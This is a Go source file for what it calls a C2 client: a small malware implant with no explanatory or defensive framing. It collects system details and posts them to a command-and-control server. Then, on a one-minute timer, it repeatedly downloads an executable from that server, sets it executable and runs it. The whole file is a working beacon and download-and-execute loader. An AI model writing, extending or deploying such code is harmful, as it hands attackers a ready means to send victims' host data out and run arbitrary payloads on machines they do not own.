package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// Define the URL of your C2 server
const c2URL = "http://127.0.0.1:5000"

// CollectSystemInfo collects information about the system.
func CollectSystemInfo() string {
	goVersion := runtime.Version()
	osName := runtime.GOOS
	arch := runtime.GOARCH
	currentDir, _ := os.Getwd()
	info := fmt.Sprintf("Go Version: %s\nOperating System: %s\nArchitecture: %s\nCurrent Working Directory: %s", goVersion, osName, arch, currentDir)

	return info
}

// SendDataToC2 sends data to the C2 server.
func SendDataToC2(data string) {
	payload := []byte(data)
	_, err := http.Post(c2URL, "application/text", bytes.NewBuffer(payload))
	if err != nil {
		fmt.Println("Error sending data to C2 server:", err)
	} else {
		fmt.Println("Data sent to C2 server successfully.")
	}
}

// DownloadAndInstallExecutable tries to download an executable from the C2 server and install it.
func DownloadAndInstallExecutable(url string) {
	response, err := http.Get(url)
	if err != nil {
		fmt.Println("Error downloading executable:", err)
		return
	}
	defer response.Body.Close()

	// Create a temporary file for the downloaded executable
	tmpFile, err := os.CreateTemp("", "downloaded_executable.*")
	if err != nil {
		fmt.Println("Error creating temporary file:", err)
		return
	}
	defer tmpFile.Close()

	// Copy the downloaded data to the temporary file
	_, err = io.Copy(tmpFile, response.Body)
	if err != nil {
		fmt.Println("Error copying data to file:", err)
		return
	}

	// Make the file executable (permissions may need to be adjusted based on your OS)
	if err := tmpFile.Chmod(0755); err != nil {
		fmt.Println("Error changing file permissions:", err)
		return
	}

	// Run the downloaded executable
	if err := exec.Command(tmpFile.Name()).Start(); err != nil {
		fmt.Println("Error running the downloaded executable:", err)
		return
	}
}

func main() {
	// Collect system information once at the start of the program
	systemInfo := CollectSystemInfo()
	SendDataToC2(systemInfo)

	// Create a timer to check for and install executables every 1 minute
	installTimer := time.NewTicker(1 * time.Minute)

	for {
		select {
		case <-installTimer.C:
			// Define the URL for the executable on your C2 server
			executableURL := c2URL + "/path/to/executable"
			DownloadAndInstallExecutable(executableURL)
		}
	}
}
